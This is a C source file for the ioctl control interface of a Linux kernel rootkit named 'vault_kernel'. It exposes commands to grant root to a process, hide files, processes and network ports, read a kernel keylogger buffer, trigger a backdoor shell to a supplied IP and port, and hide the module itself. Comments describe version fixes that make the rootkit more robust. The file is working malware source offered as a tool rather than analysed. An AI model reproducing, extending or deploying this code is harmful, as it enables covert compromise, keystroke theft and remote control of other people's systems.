/* vault_kernel - ioctl.c
 * Character device interface for userland control
 * ruby570bocadito © 2026
 */
#include "core.h"

static dev_t vault_kernel_dev;
static struct class *vault_kernel_class = NULL;
static struct cdev vault_kernel_cdev;
static int dev_major = 0;

#define VK_LIST_BUF_SIZE 4096

/*
 * Bounded snprintf for the list/stats reports.  The plain pattern
 *     p += snprintf(p, remaining, ...);
 * is a heap-overflow trap: snprintf() returns the length it WANTED to
 * write, so on truncation `p` advances past the end of the allocation
 * and `remaining` underflows to a huge size_t — every later "remaining
 * > 64" guard passes and the next call writes out of bounds (v3.3
 * shipped exactly this bug in IOCTL_LIST_HIDDEN; ~16 hidden files of
 * 255 chars were enough to corrupt the kernel heap).
 *
 * This wrapper clamps truncation to what actually fits, so `p` and
 * `*remaining` always stay inside the buffer.  Callers keep looping
 * while `remaining > 64`, which also leaves room for section headers.
 */
static size_t vk_snprint(char *p, size_t remaining, const char *fmt, ...)
{
    va_list args;
    int w;

    if (remaining <= 1)
        return 0;

    va_start(args, fmt);
    w = vsnprintf(p, remaining, fmt, args);
    va_end(args);

    if (w < 0)
        return 0;
    if ((size_t)w >= remaining)
        return remaining - 1;   /* truncated: report only what fits */
    return (size_t)w;
}

static long vault_kernel_ioctl(struct file *file, unsigned int cmd,
                           unsigned long arg) {
    char kbuf[256];
    int ret, pid_int;
    uint16_t port;
    char *ip, *port_str;

    switch (cmd) {

    case IOCTL_GIVE_ROOT:
        if (copy_from_user(&pid_int, (int __user *)arg, sizeof(int)))
            return -EFAULT;
        /* pid <= 0 → priv_esc treats it as "the caller" */
        return priv_esc_give_root(pid_int);

    case IOCTL_HIDE_FILE:
        if (copy_from_user(kbuf, (char __user *)arg, 256))
            return -EFAULT;
        kbuf[255] = '\0';
        file_hide_add(kbuf);
        break;

    case IOCTL_UNHIDE_FILE:
        if (copy_from_user(kbuf, (char __user *)arg, 256))
            return -EFAULT;
        kbuf[255] = '\0';
        file_hide_del(kbuf);
        break;

    case IOCTL_HIDE_PID:
        if (copy_from_user(&pid_int, (int __user *)arg, sizeof(int)))
            return -EFAULT;
        proc_hide_add(pid_int);
        break;

    case IOCTL_UNHIDE_PID:
        if (copy_from_user(&pid_int, (int __user *)arg, sizeof(int)))
            return -EFAULT;
        proc_hide_del(pid_int);
        break;

    case IOCTL_HIDE_PORT:
        if (copy_from_user(&port, (uint16_t __user *)arg, sizeof(uint16_t)))
            return -EFAULT;
        net_hide_add_port(port);
        break;

    case IOCTL_UNHIDE_PORT:
        if (copy_from_user(&port, (uint16_t __user *)arg, sizeof(uint16_t)))
            return -EFAULT;
        net_hide_del_port(port);
        break;

    case IOCTL_LIST_HIDDEN: {
        /* 4 KiB on the 8/16 KiB kernel stack is a stack-overflow
         * hazard — build the report in heap memory instead, and do
         * every append through vk_snprint() (truncation-safe; see
         * the heap-overflow note above it). */
        char *buf;
        char *p;
        size_t remaining;
        size_t written;
        int i;

        buf = kzalloc(VK_LIST_BUF_SIZE, GFP_KERNEL);
        if (!buf)
            return -ENOMEM;

        p = buf;
        remaining = VK_LIST_BUF_SIZE;

        written = vk_snprint(p, remaining, "--- Hidden PIDs ---\n");
        p += written; remaining -= written;
        for (i = 0; i < hidden_pid_count && remaining > 64; i++) {
            written = vk_snprint(p, remaining, "  pid: %d\n", hidden_pids[i]);
            p += written; remaining -= written;
        }

        if (remaining > 64) {
            written = vk_snprint(p, remaining, "--- Hidden Files ---\n");
            p += written; remaining -= written;
        }
        for (i = 0; i < hidden_file_count && remaining > 64; i++) {
            written = vk_snprint(p, remaining, "  %s\n", hidden_files[i]);
            p += written; remaining -= written;
        }

        if (remaining > 64) {
            written = vk_snprint(p, remaining, "--- Hidden Ports ---\n");
            p += written; remaining -= written;
        }
        for (i = 0; i < hidden_port_count && remaining > 64; i++) {
            written = vk_snprint(p, remaining, "  port: %d\n",
                                 hidden_ports[i]);
            p += written; remaining -= written;
        }

        if (copy_to_user((char __user *)arg, buf, VK_LIST_BUF_SIZE)) {
            kfree(buf);
            return -EFAULT;
        }
        kfree(buf);
        break;
    }

    case IOCTL_KEYLOG_READ:
        ret = keylogger_read((char __user *)arg, 4096);
        if (ret < 0)
            return ret;
        break;

    case IOCTL_KEYLOG_CLEAR:
        keylogger_clear();
        break;

    case IOCTL_BACKDOOR_SHELL:
        if (copy_from_user(kbuf, (char __user *)arg, 256))
            return -EFAULT;
        kbuf[255] = '\0';
        ip = kbuf;
        port_str = strchr(kbuf, ':');
        if (!port_str)
            return -EINVAL;
        *port_str++ = '\0';
        ret = backdoor_trigger_shell(ip, port_str);
        if (ret < 0)
            return ret;
        break;

    case IOCTL_BACKDOOR_MAGIC:
        if (copy_from_user(kbuf, (char __user *)arg, 16))
            return -EFAULT;
        kbuf[15] = '\0';
        backdoor_set_magic(kbuf);
        break;

    case IOCTL_MODULE_HIDE:
        stealth_hide_module();
        break;

    case IOCTL_MODULE_UNHIDE:
        stealth_unhide_module();
        break;

    case IOCTL_RESET_ALL:
        /* Teardown in one shot: forget every hidden file/pid/port.
         * Does NOT touch the module stealth state — that is handled
         * by IOCTL_MODULE_UNHIDE. */
        file_hide_reset();
        proc_hide_reset();
        net_hide_reset();
        pr_info(VAULT_KERNEL_TAG " reset: all hide lists cleared\n");
        break;

    case IOCTL_GET_STATS: {
        char *buf;
        long uptime_s = 0;

        if (vk_load_jiffies)
            uptime_s = (long)((jiffies - vk_load_jiffies) / HZ);

        buf = kzalloc(VK_LIST_BUF_SIZE, GFP_KERNEL);
        if (!buf)
            return -ENOMEM;

        snprintf(buf, VK_LIST_BUF_SIZE,
                 "module=vault_kernel version=%s\n"
                 "hooks_installed=%d hooks_planned=%d\n"
                 "module_hidden=%d\n"
                 "hidden_files=%d hidden_pids=%d hidden_ports=%d\n"
                 "keylog_bytes=%zu\n"
                 "uptime_s=%ld\n",
                 VAULT_KERNEL_VERSION,
                 hooking_installed_count(), hooks_count,
                 module_hidden,
                 hidden_file_count, hidden_pid_count, hidden_port_count,
                 keylogger_len(),
                 uptime_s);

        if (copy_to_user((char __user *)arg, buf, VK_LIST_BUF_SIZE)) {
            kfree(buf);
            return -EFAULT;
        }
        kfree(buf);
        break;
    }

    default:
        return -ENOTTY;
    }

    return 0;
}

static int vault_kernel_open(struct inode *inode, struct file *file) {
    /*
     * Control-plane hardening (v3.4): only CAP_SYS_ADMIN may open the
     * device.  devtmpfs creates the node 0600 root:root, but a udev
     * rule, a container bind-mount or a distro quirk could loosen
     * that — and IOCTL_GIVE_ROOT would then hand root credentials to
     * ANY local user.  Defense in depth: verify capabilities here,
     * in the module itself, regardless of the node's mode.
     */
    if (!capable(CAP_SYS_ADMIN))
        return -EPERM;
    return 0;
}

static int vault_kernel_release(struct inode *inode, struct file *file) {
    return 0;
}

static struct file_operations vault_kernel_fops = {
    .owner          = THIS_MODULE,
    .unlocked_ioctl = vault_kernel_ioctl,
    .open           = vault_kernel_open,
    .release        = vault_kernel_release,
};

int ioctl_init(void) {
    int ret;

    /* Allocate device number */
    ret = alloc_chrdev_region(&vault_kernel_dev, 0, 1, DEVICE_NAME);
    if (ret < 0) {
        pr_err(VAULT_KERNEL_TAG " failed to allocate chrdev (%d)\n", ret);
        return ret;
    }
    dev_major = MAJOR(vault_kernel_dev);

    /* Create device class (visible in /sys/class) */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6,4,0)
    vault_kernel_class = class_create(DEVICE_NAME);
#else
    vault_kernel_class = class_create(THIS_MODULE, DEVICE_NAME);
#endif
    if (IS_ERR(vault_kernel_class)) {
        unregister_chrdev_region(vault_kernel_dev, 1);
        return PTR_ERR(vault_kernel_class);
    }

    /* Create device node — device_create() returns ERR_PTR on
     * failure, never NULL, so a bare !ptr check never fires. */
    {
        struct device *dev;
        dev = device_create(vault_kernel_class, NULL, vault_kernel_dev,
                            NULL, DEVICE_NAME);
        if (IS_ERR(dev)) {
            class_destroy(vault_kernel_class);
            unregister_chrdev_region(vault_kernel_dev, 1);
            pr_err(VAULT_KERNEL_TAG " device_create failed (%ld)\n",
                   PTR_ERR(dev));
            return PTR_ERR(dev);
        }
    }

    /* Initialize cdev */
    cdev_init(&vault_kernel_cdev, &vault_kernel_fops);
    ret = cdev_add(&vault_kernel_cdev, vault_kernel_dev, 1);
    if (ret) {
        device_destroy(vault_kernel_class, vault_kernel_dev);
        class_destroy(vault_kernel_class);
        unregister_chrdev_region(vault_kernel_dev, 1);
        return ret;
    }

    pr_info(VAULT_KERNEL_TAG " char device /dev/%s (major %d)\n",
            DEVICE_NAME, dev_major);
    return 0;
}

void ioctl_cleanup(void) {
    cdev_del(&vault_kernel_cdev);
    device_destroy(vault_kernel_class, vault_kernel_dev);
    class_destroy(vault_kernel_class);
    unregister_chrdev_region(vault_kernel_dev, 1);

    pr_info(VAULT_KERNEL_TAG " char device removed\n");
}
